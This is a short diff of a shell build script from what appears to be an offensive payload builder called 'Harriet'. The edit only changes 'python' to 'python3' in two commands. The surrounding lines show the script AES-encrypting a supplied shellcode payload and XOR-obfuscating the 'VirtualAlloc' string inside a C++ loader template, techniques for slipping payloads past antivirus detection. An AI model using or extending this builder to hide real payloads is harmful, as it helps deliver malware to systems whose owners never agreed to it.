@@ -31,7 +31,7 @@ cp Harriet/ThreadPoolWait/template.cpp Harriet/ThreadPoolWait/Resources/template
 echo -e ${yellow}"+++Encrypting Payload+++" ${clear}
 echo ""
 sleep 2
-python Harriet/ThreadPoolWait/Resources/aesencrypt.py $Shellcode > shell.txt
+python3 Harriet/ThreadPoolWait/Resources/aesencrypt.py $Shellcode > shell.txt
 echo -e ${yellow}"***Encryption Completed***"${clear}
 echo ""
 cp shell.txt shell2.txt
@@ -85,7 +85,7 @@ rm shell.txt
 
 #VIRTUALALLOC - XOR String
 echo VirtualAlloc > virt.txt
-python Harriet/ThreadPoolWait/Resources/xor.py virt.txt > virtalloc.txt
+python3 Harriet/ThreadPoolWait/Resources/xor.py virt.txt > virtalloc.txt
 virt=$(cat virtalloc.txt)
 virt2="${virt::-8}" 
 sed -i "s/VIRALO/$virt2/g" Harriet/ThreadPoolWait/Resources/template.cpp 
